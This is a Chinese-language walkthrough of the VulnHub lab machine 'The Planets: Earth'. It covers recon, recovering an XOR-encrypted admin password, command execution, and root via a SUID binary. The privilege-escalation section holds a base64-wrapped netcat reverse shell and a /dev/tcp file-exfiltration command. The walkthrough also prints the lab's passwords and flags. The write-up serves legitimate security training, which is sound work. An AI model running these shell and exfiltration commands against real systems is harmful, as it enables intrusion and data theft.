# Earth Writeup

這是一台來自 [VulnHub](https://www.vulnhub.com/entry/the-planets-earth,755/) 的 Linux 靶機，名稱為 `The Planets: Earth`，由 `SirFlash` 發布於 `2021-11-02`。

## 目錄

- [Earth Writeup](#earth-writeup)
  - [目錄](#目錄)
  - [靶機基礎資訊](#靶機基礎資訊)
  - [攻擊鏈摘要](#攻擊鏈摘要)
  - [資訊收集](#資訊收集)
  - [找到虛擬主機與登入入口](#找到虛擬主機與登入入口)
  - [還原密碼並登入後台](#還原密碼並登入後台)
  - [取得 User Flag](#取得-user-flag)
  - [權限提升](#權限提升)
  - [參考來源](#參考來源)

## 靶機基礎資訊

- 平台：VulnHub
- 靶機名稱：`The Planets: Earth`
- 作者：`SirFlash`
- 發布日期：`2021-11-02`
- 系列：`The Planets`
- 難度：`Easy`
- 題目提示：作者說明這台比同系列的 `Mercury` 更有挑戰性，但仍屬於偏難的 `Easy`
- 目標：取得 `user flag` 與 `root flag`
- 下載檔名：`Earth.ova`
- 作業系統：`Linux`
- 虛擬機格式：`VirtualBox - OVA`
- 建議環境：以 `VirtualBox` 為主，`VMware` 可能無法正確運行
- 網路設定：`DHCP enabled`，IP 會自動分配

## 攻擊鏈摘要

- 先對同網段進行主機掃描，確認目標 IP 與對外開放的服務。
- 從 `443` 的 TLS 憑證找出虛擬主機名稱，進一步發現 `earth.local` 與 `terratest.earth.local`。
- 在 `terratest.earth.local` 上找到測試用筆記與加密資料，藉此推回管理者帳號與密碼。
- 登入 `earth.local/admin` 後，透過後台提供的命令執行功能取得低權限 shell。
- 從檔案系統中找出 `user_flag.txt`，再利用 SUID 程式 `reset_root` 重設 `root` 密碼。
- 最後切換為 `root`，讀取 `root_flag.txt` 完成整台靶機。

## 資訊收集

- 因為這次是在同一個虛擬機網段中進行測試，所以先對整個 `C` 段做掃描，找出可疑主機。
- 本文中的目標 IP 為 `192.168.233.136`，屬於測試時使用的私有網段位址。

```bash
nmap 192.168.233.0/24
```

![目標服務掃描](<assets/03-recon-service-scan.png>)

- 確認目標 IP 後，進一步以 `-sV -A` 進行版本與詳細資訊掃描。
- 掃描結果顯示目標主要開啟 `22`、`80`、`443` 三個 port。
- `80` 為 `Apache httpd 2.4.51`，`443` 同樣是 Apache，且 TLS 資訊中可看到額外主機名稱。

```bash
nmap 192.168.233.136 -sV -A
```

![直接以 IP 存取 80 port](<assets/04-recon-port-80-bad-request.png>)

- 直接以 IP 存取 `80` port 時，只會得到 `Bad Request (400)`，表示網站很可能依賴正確的 `Host` header 或虛擬主機設定。

![gobuster 掃描 IP 失敗](<assets/05-recon-gobuster-ip-failed.png>)

- 此時直接對 IP 做目錄枚舉也沒有有效結果，進一步支持這台主機是以虛擬主機名稱來區分服務。

## 找到虛擬主機與登入入口

![主機名稱線索](<assets/06-recon-tls-hostnames.png>)

- 回頭查看 `nmap` 的 TLS 掃描資訊，可以在 `Subject Alternative Name` 中看到兩個主機名稱：
- `earth.local`
- `terratest.earth.local`

![編輯 hosts](<assets/07-recon-edit-hosts.png>)

- 將這兩個名稱與目標 IP 一起加入 `/etc/hosts` 後，就能正確以虛擬主機名稱瀏覽網站。

![earth.local 首頁](<assets/08-recon-earth-homepage.png>)

- 改用 `http://earth.local` 後，可以正常看到首頁 `Earth Secure Messaging Service`。

```bash
gobuster dir -u http://earth.local -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![gobuster 找到 admin](<assets/09-recon-gobuster-earth-admin.png>)

- 對 `earth.local` 進行目錄枚舉，可找到 `/admin/` 路徑。

![admin 頁面](<assets/10-recon-earth-admin-page.png>)

- 進入 `http://earth.local/admin/` 後，頁面顯示 `Admin Command Tool`，但尚未登入。

![登入頁面](<assets/11-recon-earth-login-page.png>)

- 點擊 `Log In` 後，會進入後台登入頁面。

![gobuster 掃描 HTTPS](<assets/14-creds-gobuster-https-success.png>)

- 接著轉向 `https://terratest.earth.local` 做目錄枚舉。由於站點使用 HTTPS，測試時加上 `-k` 以忽略憑證驗證問題。
- 掃描結果中，`index.html` 與 `robots.txt` 皆為 `200`。

```bash
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/common.txt
```

![robots.txt](<assets/16-creds-robots-txt.png>)

- `robots.txt` 中額外透露了一條有意思的路徑規則：`/testingnotes.*`

![testingnotes.txt](<assets/17-creds-testingnotes-txt.png>)

- 實際查看 `testingnotes.txt` 後，可以取得幾個重要線索：
- 訊息系統使用 `XOR` 做加密
- 管理介面的使用者名稱是 `terra`
- 加密用的 key 在 `testdata.txt`

![testdata.txt](<assets/18-creds-testdata-txt.png>)

- `testdata.txt` 內是一大段文字內容，後續可作為 XOR 解密的 key。

## 還原密碼並登入後台

![訊息頁面與歷史訊息](<assets/20-creds-previous-messages.png>)

- 回到訊息頁面後，可以看到下方 `Previous Messages` 內有多段十六進位字串。
- 由於 `testingnotes.txt` 已明確提到系統使用 XOR，這些歷史訊息就是最值得測試的候選密文。

![CyberChef 解密](<assets/22-creds-cyberchef-decrypt-3.png>)

- 將候選密文交給 `CyberChef`，先做 `From Hex`，再以 `testdata.txt` 的內容作為 XOR key 解密。
- 前兩段結果不夠明確，但第三段可解出重複出現的明文內容，從中可整理出密碼：
- `earthclimatechangebad4humans`

![登入頁面](<assets/23-creds-login-with-password.png>)

- 這時就可以使用前面取得的帳號與密碼登入管理介面：
- Username：`terra`
- Password：`earthclimatechangebad4humans`

![登入後台成功](<assets/24-creds-admin-command-tool.png>)

- 登入成功後，會進入 `Admin Command Tool`，並可直接送出系統命令。

## 取得 User Flag

![whoami 驗證命令執行](<assets/25-user-flag-whoami.png>)

- 先以 `whoami` 驗證後台是否真的能執行系統命令。
- 頁面回顯 `apache`，代表目前取得的是 Web 服務帳號權限。

```text
whoami
```

- 接著從常見網站目錄開始往下枚舉，逐步找出與 Earth 網站相關的實際資料夾位置。

![查看 /var/www/html](<assets/26-user-flag-list-var-www-html.png>)

- 先從 `/var/www/html` 開始，可以看到其中存在 `terratest.earth.local`。

![查看 /var](<assets/27-user-flag-list-var.png>)

- 再往上查看 `/var` 底下的內容，會發現還有一個與題目名稱更直接相關的 `earth_web` 目錄。

![找到 earth_web](<assets/28-user-flag-list-earth-web.png>)

- 列出 `/var/earth_web` 後，可以看到其中包含 `user_flag.txt`。

![讀取 user flag](<assets/29-user-flag-read-user-flag.png>)

- 直接讀取該檔案即可取得 `user flag`：
- `user_flag_3353b67d6437f07ba7d34afd7d2fc27d`

```bash
cat /var/earth_web/user_flag.txt
```

## 權限提升

- 既然後台可執行命令，下一步就是把這個能力轉成較好操作的 shell。
- 直接送常見的 `reverse shell` payload 時沒有成功，因此改用 `base64` 包裹後再解碼執行。

![base64 編碼 payload](<assets/32-privesc-base64-payload.png>)

```bash
echo 'nc -e /bin/bash 192.168.233.135 4896' | base64
```

![收到反向 shell](<assets/34-privesc-reverse-shell.png>)

- 在攻擊端先用 `nc -lvnp 4896` 監聽，再於後台送出 base64 解碼後的 payload，即可取得來自目標主機的 shell。
- 取得 shell 後，再用 Python 升級成互動式 shell。

```bash
nc -lvnp 4896
python -c "import pty; pty.spawn('/bin/bash')"
```

![搜尋 SUID](<assets/35-privesc-find-suid-binaries.png>)

- 取得 shell 後，先檢查系統內的 SUID 程式。
- 在結果中可以看到一個相當顯眼的 `/usr/bin/reset_root`。

```bash
find / -perm -u=s -type f 2>/dev/null
```

![ldd 檢查 reset_root](<assets/39-privesc-ldd-reset-root.png>)

- 先用 `ldd` 觀察這個檔案的連結情況，確認它是一般可分析的 ELF 二進位檔。

```bash
ldd /usr/bin/reset_root
```

![ltrace 分析 reset_root](<assets/42-privesc-ltrace-reset-root.png>)

- 將 `/usr/bin/reset_root` 傳回攻擊端後，使用 `ltrace` 分析它的邏輯。
- 從輸出可以看出，這支程式會檢查三個特定檔案是否存在：
- `/dev/shm/kHgTFI5G`
- `/dev/shm/Zw7bV9U5`
- `/tmp/kcM0Wewe`

```bash
nc -lvnp 5555 > reset_root
cat /usr/bin/reset_root > /dev/tcp/192.168.233.135/5555

chmod +x reset_root
ltrace ./reset_root
```

![建立觸發檔案](<assets/43-privesc-create-trigger-files.png>)

- 回到目標主機後，依照 `ltrace` 結果建立對應檔案，再執行 `reset_root`。
- 這次程式會直接將 `root` 密碼重設為 `Earth`。

```bash
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
reset_root
```

![切換成 root](<assets/44-privesc-su-root.png>)

- 接著就能用新密碼切換為 `root`：

```bash
su root
# password: Earth
```

![取得 root flag](<assets/45-privesc-root-flag.png>)

- 最後進入 `/root`，讀取 `root_flag.txt`：
- `root_flag_b0da9554d29db2117b02aa8b66ec492e`

```bash
cat /root/root_flag.txt
```

## 參考來源

- VulnHub: [The Planets: Earth](https://www.vulnhub.com/entry/the-planets-earth,755/)
